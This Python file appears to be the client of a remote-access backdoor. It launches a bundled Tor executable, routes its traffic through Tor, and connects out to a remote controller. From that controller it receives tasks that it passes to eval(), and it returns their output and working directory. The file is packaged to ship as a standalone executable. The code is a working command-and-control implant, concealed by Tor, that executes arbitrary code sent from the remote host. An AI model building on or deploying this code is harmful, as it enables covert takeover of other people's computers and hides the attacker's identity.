import socks
import socket
import sys
import subprocess as sp
import os
import sys

"""
A class to interact with the tor expert bundle.
Note: The stem library could be used to interact with tor.
"""
class Tor:
    PATH = '.\\torbundle\\Tor\\tor.exe'

    def __init__(self):
        self.start()
        socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket

    def start(self):
        try:
            path = self.resource_path(self.PATH)
            self.torProc = sp.Popen(path, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
        except subprocess.SubprocessError as error:
            print(str(error))
            sys.exit(1)

    # Source: https://stackoverflow.com/questions/7674790/bundling-data-files-with-pyinstaller-onefile
    def resource_path(self, relative_path):
        # Get absolute path to resource, works for dev and for PyInstaller
        # needed because the path of the tor expert bundle changes due to pyinstaller
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        return os.path.join(base_path, relative_path)


"""
A class to handle the client socket.
"""
class ClientSocket:
    ENCODING = 'utf-8'

    def __init__(self, remHost, remPort):
        self.remAddr = (remHost, remPort)
        self.__sock = self.createConnection()

    def createConnection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(self.remAddr)
        except socket.error as error:
            print(str(error))
            sys.exit(1)
        else:
            return sock

    """
    The client always sends back the output of the received task,
    and the current working directory.
    """
    def send(self, output):
        try:
            data = {'output' : output, 'cwd' : os.getcwd()}
            self.__sock.send(str(data).encode(self.ENCODING))
        except socket.error:
            sys.exit(1)

    """
    The client receives a dictionary containing a task,
    and a list of optional arguments, dependent on the task.
    """
    def receive(self, numBytes):
        try:
            data = self.__sock.recv(numBytes)
            data = data.decode(self.ENCODING)
            print(data)
            data = eval(data)
        except socket.error as error:
            sys.exit(1)
        else:
            return data['task'], data['args']